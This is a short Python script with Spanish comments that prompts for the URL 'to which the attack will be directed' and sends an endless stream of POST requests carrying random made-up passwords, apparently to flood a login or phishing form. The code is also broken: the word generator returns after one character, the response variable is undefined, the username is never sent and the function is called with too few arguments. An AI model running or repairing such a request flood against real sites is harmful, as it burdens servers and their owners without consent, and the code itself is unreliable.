import requests
import random

# Genera Usuarios y Contraseñas alestorios

link = input(" Pegue la dirección URL, a donde será dirigido el ataque: ") 

def random_word(): 
	word = ''
	
	for i in range (10):
		word += random.choice('abnakkskkskksklslkskkskkskskkskdk')
		return word

#Manda la petición 
def send_post (url, username, password):
	data = {"password": password}
	
	try:
		requests.post (url, data = data) 
		
		if r.status_code == 200:
			print('OK- Enviado: Usuario: ' + username + ' y Contraseña: ' + password +'\n') 
		else:
			return "Error" 
	except requests.exceptions.RequestException as e:
		return "Error"

# Lo hace hasta el infinito
while True:
	username = random_word()
	password = random_word()
	send_post(link) 